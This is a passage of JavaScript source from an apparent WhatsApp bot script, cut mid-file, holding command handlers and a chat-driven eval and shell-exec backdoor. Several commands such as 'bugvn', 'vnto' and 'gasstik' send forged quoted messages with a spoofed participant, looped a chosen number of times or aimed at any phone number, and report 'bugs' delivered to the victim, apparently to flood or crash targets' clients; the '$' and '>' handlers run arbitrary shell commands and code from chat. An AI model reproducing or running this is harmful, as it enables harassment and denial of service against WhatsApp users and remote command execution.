"url": "wa.me/6288286858385"
},
"businessOwnerJid": "6288286858385@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ctlg })
hisoka.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break

case 'bugvn':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('chan.mp3')
 hisoka.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
 }
 }
break
case 'bugstik':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('anjas.webp')
hisoka.sendImageAsSticker(m.chat, hey, adehvn, { packname: global.packname, author: global.author })
}
}
break
case 'vnto':
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('chan.mp3')
 hisoka.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
case 'gasvn':
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('chan.mp3')
 hisoka.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
  hisoka.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
case 'stikto':
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('anjas.webp')
hisoka.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
case 'gasstik':
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('anjas.webp')
 hisoka.sendImageAsSticker(m.chat, hey, adehvn, { packname: global.packname, author: global.author })
hisoka.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    hisoka.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
